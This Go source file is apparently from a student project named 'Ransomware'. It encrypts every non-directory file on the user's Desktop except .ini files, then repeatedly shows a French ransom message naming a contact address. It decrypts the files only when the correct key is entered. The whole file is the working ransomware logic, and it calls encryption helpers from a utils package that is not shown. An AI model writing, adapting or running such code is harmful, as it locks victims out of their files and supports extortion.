package main

import (
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/GnsiXenon/Projet-Dev/Ransomware/utils"
)

const (
	leading = "[*]"
)

func main() {
	fmt.Printf("%s Chiffrement de vos fichiers en cours...\n\n", leading)
	if err := os.Chdir(utils.DesktopPath); err != nil {
		log.Printf("os.Chdir(desktopPath): %v", err)
		return
	}
	files, err := os.ReadDir(".")
	if err != nil {
		log.Printf("Erreur lors de la lecture du répertoire: %v", err)
		return
	}

	for _, file := range files {
		if !file.IsDir() && !strings.Contains(file.Name(), ".ini") {
			if err := utils.EncryptFile(file.Name(), utils.Key); err != nil {
				log.Printf("Erreur lors du chiffrement du fichier: %v", err)
				return
			}
		}
	}
	fmt.Printf("%s Chiffrement de vos fichiers terminé.\n\n", leading)
	for {
		fmt.Printf("%s Vos fichiers sont désormais chiffrés\n\n%s Contactez hardware.hacker@cyberdays.com pour déchiffrer vos fichiers\n\n", leading, leading)
		fmt.Printf("%s Entrez la clé de déchiffrement : ", leading)
		userInput := ""
		fmt.Scanln(&userInput)
		if userInput == utils.Code {
			for _, file := range files {
				if !file.IsDir() && !strings.Contains(file.Name(), ".ini") {
					if err := utils.Decrypt(file.Name(), utils.Key); err != nil {
						log.Printf("Erreur lors du chiffrement du fichier: %v", err)
						return
					}
				}
			}
			break
		}
	}
}
